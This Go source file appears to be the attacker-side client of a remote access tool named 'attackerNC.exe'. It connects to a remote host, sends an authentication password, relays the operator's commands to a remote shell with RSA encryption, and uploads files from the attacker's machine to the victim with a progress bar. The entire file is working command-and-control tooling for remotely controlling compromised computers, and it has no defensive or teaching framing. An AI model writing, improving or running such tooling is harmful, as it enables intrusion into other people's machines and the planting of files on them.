package main

import (
	"bufio"
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/wenzhenxi/gorsa"
)

const (
	CONN_TYPE = "tcp"
)

var Pubkey = `-----BEGIN PUBLIC KEY-----
-----END PUBLIC KEY-----
`

var Pirvatekey = `-----BEGIN Private key-----
-----END Private key-----
`

func main() {
	flag.Parse()
	args := flag.Args()

	if len(args) < 3 {
		println("Usage: attackerNC.exe Local_addr remote_addr port")
		os.Exit(1)
	}
	LAddr := args[0]
	RAddr := args[1]
	port := args[2]

	var local net.TCPAddr
	local.IP = net.ParseIP(LAddr)
	local.Port = 4321

	var remote net.TCPAddr
	remote.IP = net.ParseIP(RAddr)
	var err error
	remote.Port, err = strconv.Atoi(port)
	if err != nil {
		println("Invalid port: " + err.Error())
		os.Exit(1)
	}

	conn, err := net.DialTCP(CONN_TYPE, &local, &remote)
	conn.SetKeepAlive(false)
	if err != nil {
		fmt.Println("Error connecting:", err.Error())
		os.Exit(1)
	}

	// Auth Process
	reader := bufio.NewReader(os.Stdin)
	authPass, _ := reader.ReadString('\n')
	conn.Write(encData([]byte(authPass)))

	buffer := make([]byte, 16384)
	dataReader := bufio.NewReader(os.Stdin)
	read := true
	lastLine := ""
	for {
		if read {
			length, err := conn.Read(buffer)
			dataRec := string(buffer[:length])
			if err != nil {
				fmt.Print(err)
				conn.Close()
				os.Exit(1)
			}
			data := decData(dataRec)
			lines := strings.Split(data, "\n")
			lastLine = lines[len(lines)-1]
			fmt.Print(data)
		} else {
			// Reprint last line
			fmt.Print(lastLine)
		}
		read = true
		data, _ := dataReader.ReadString('\n')
		parts := strings.Split(data, " ")
		cmd := strings.ToLower(parts[0])
		if cmd == "upload\r\n" {
			println("Usage: upload <path of file on attackers pc>")
			read = false
			continue
		}
		if cmd == "upload" {
			path := ""
			for i, s := range parts {
				if i == 0 {
					continue
				}
				path += s + " "
			}
			path = strings.ReplaceAll(path, "\r\n", "")
			path = strings.ReplaceAll(path, "\"", "")
			stat, err := os.Stat(path)
			if err != nil && strings.Contains(err.Error(), "cannot find") {
				println("Error: " + path + " Does not exist")
				read = false
				continue
			}
			if stat.IsDir() {
				println("Error: " + path + " is a folder")
				read = false
				continue
			}
			conn.Write(encData([]byte(data)))
			uploadFile(conn, path)
			continue
		}
		conn.Write(encData([]byte(data)))
	}
}
func uploadFile(conn net.Conn, path string) {
	// Encode the file to b64 (using powershell, since the syntax is shorter).
	//localDir, err := os.Getwd()
	//handleError(err)
	//b64File := localDir + "\\temp.b64"
	//command := "[Convert]::ToBase64String([IO.File]::ReadAllBytes(\"" + path + "\")) > " + b64File
	//_, err = exec.Command("powershell", command).Output()
	//handleError(err)
	stat, err := os.Stat(path)
	handleError(err)
	size := stat.Size()

	// open handle on file
	handle, err := os.Open(path)
	// handle, err := os.Open(localDir + "\\test.txt")
	handleError(err)
	buffer := make([]byte, 200000)
	disBuff := make([]byte, 200)
	offset := int64(0)
	precent := 1
	println("Uploading: ")
	for {
		bytesRead, err := handle.Read(buffer)

		// Wait for "Ack"
		conn.Read(disBuff)
		time.Sleep(time.Millisecond * 500)
		if err != nil && err == io.EOF {
			conn.Write(encData([]byte("end")))
			break
		} else {
			handleError(err)
		}
		data := encData(buffer[:bytesRead])
		conn.Write(data)
		offset += int64(bytesRead)
		handle.Seek(offset, 0)
		for offset > (size/10)*int64(precent) {
			print("#")
			precent += 1
		}
	}
	print("\n")
	handle.Close()
	//_, err = exec.Command("powershell", "rm "+b64File).Output()
	handleError(err)
}

func encData(data []byte) []byte {
	return []byte(encRsa(string(data)))
}

func decData(data string) string {
	return decRsa(data)
}

func encRsa(data string) string {
	encData, err := gorsa.PublicEncrypt(data, Pubkey)
	if err != nil {
		return ""
	}
	return encData
}

func decRsa(encData string) string {
	decData, err := gorsa.PriKeyDecrypt(encData, Pirvatekey)
	if err != nil {
		return ""
	}
	return string(decData)
}

func handleError(err error) {
	if err != nil {
		println(err.Error())
		panic(err)
	}
}
